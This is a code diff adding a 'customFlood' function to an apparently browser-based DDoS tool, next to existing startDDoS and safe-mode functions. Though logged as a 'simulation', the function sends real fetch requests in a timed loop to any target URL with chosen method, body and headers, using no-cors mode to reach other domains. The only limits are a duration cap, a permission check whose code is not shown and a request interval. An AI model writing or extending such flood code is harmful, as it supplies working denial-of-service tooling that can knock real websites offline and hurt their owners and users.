@@ -331,3 +331,57 @@ async function startDDoS(target, duration, attackType) {
 //Expose the functions to the window object so it can be called from HTML
 window.startDDoS = startDDoS;
 window.toggleSafeMode = toggleSafeMode;
+window.customFlood = customFlood;
+
+// Function to add a custom flood attack
+async function customFlood(target, durationSeconds, method, body, headers) {
+    log(RED + "Starting Custom Flood attack simulation on: " + target + " for " + durationSeconds + " seconds." + RESET);
+
+    if (durationSeconds > MAX_DDOS_DURATION) {
+        log(RED + "Duration exceeds maximum allowed limit." + RESET);
+        alert(RED + "Duration exceeds maximum allowed limit of " + MAX_DDOS_DURATION + " seconds." + RESET);
+        return;
+    }
+
+    if (!await verifyPermissions(target)) {
+        return;
+    }
+
+    const startTime = Date.now();
+    let endTime = startTime + (durationSeconds * 1000);
+
+    while (Date.now() < endTime) {
+        try {
+            // Simulate sending a custom request
+            log("Sending custom request to: " + target);
+            const requestOptions = {
+                method: method,
+                keepalive: true,
+                mode: 'no-cors' //To allow requests to other domains
+            };
+
+            if (body) {
+                requestOptions.body = body;
+            }
+
+            if (headers) {
+                requestOptions.headers = headers;
+            }
+
+            fetch(target, requestOptions)
+                .then(response => {
+                    log(`Response received: ${response.status}`);
+                })
+                .catch(error => {
+                    log(RED + "Error sending request: " + error + RESET);
+                });
+
+            //Delay to simulate slowness.
+            await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
+        } catch (error) {
+            log(RED + "Error during attack: " + error + RESET);
+        }
+    }
+
+    log(RED + "Custom Flood attack simulation COMPLETED." + RESET);
+}
